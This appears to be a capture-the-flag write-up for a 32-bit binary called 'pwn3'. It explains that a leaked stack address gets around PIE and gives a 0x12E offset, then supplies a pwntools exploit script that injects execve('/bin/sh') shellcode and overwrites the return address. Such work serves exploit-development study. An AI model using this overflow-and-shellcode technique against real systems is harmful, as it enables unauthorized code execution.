# App

![image](https://user-images.githubusercontent.com/115867891/206482114-72b55f3b-3812-4bbc-badd-e888fa97cf74.png)

Has `PIE`, so we need a leak.

# Dissasembly

Luckily, this is exactly like `Pilot CTF` so it leaks an address for us.

![image](https://user-images.githubusercontent.com/115867891/206482264-0d9e20d3-3ee2-42ee-b294-77769aa121f1.png)

The only difference is the offset, which is 0x12A till EBP + 4 (EBP) until RET ADDR = 0x12E.

# Exploit

```
from pwn import *

target = process('./pwn3')

# Print out the text, up to the address of the start of our input
print(target.recvuntil("journey "))

# Scan in the rest of the line
leak = target.recvline()

# Strip away the characters not part of our address
shellcodeAdr = int(leak.strip(b"!\n"), 16)
print(shellcodeAdr)

# Make the payload
payload = b""

buf =  b""
buf += b"\x31\xc9\xf7\xe1\xb0\x0b\x68\x2f\x73\x68\x00\x68\x2f"
buf += b"\x62\x69\x6e\x89\xe3\xcd\x80"
                                        
# Pad the rest of the space to the return address with zeroes

payload += buf

payload += b"\x90" * (0x12e - len(payload))	# 0x15 is shellcode length
# Overwrite the return address with the leaked address which points to the start of our shellcode

payload += p32(shellcodeAdr)

print("Size : ", hex(len(payload)))
# Send the payload
target.sendline(payload)

# Drop to an interactive shell to use our newly popped shell
target.interactive()

```

![image](https://user-images.githubusercontent.com/115867891/206485553-086f2355-0d7e-49c5-b352-6c8230a84e02.png)

